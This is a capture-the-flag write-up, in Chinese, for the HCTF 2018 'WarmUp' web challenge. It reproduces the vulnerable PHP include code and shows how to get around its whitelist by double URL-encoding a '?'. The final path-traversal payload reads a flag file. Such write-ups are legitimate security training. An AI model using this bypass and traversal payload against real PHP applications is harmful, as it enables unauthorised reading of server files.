# [HCTF 2018]WarmUp

查看源代码发现注释内容 **source.php**，访问后的得到源代码：
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

代码中提示存在 **hint.php**，访问后得到提示内容：
```
flag not here, and flag in ffffllllaaaagggg
```

根据代码内容，得出这是一道文件包含的题，需要满足三个条件即可包含文件：
1. 需要传入file参数
2. file参数必须是字符串
3. 绕过`emmm::checkFile()`函数检测

checkFile()函数中对文件名称进行截取从0到?的内容，然后进行白名单校验，然后进行url解码，再次进行校验。

如果直接以`source.php?/../../file`的方式是无法读取的，因为?号后面的内容会被忽略，可以对?号进行二次url编码，得到`%25%33%66`

然后根据hint内容构造payload:
```
file=source.php%25%33%66/../../../../ffffllllaaaagggg
```
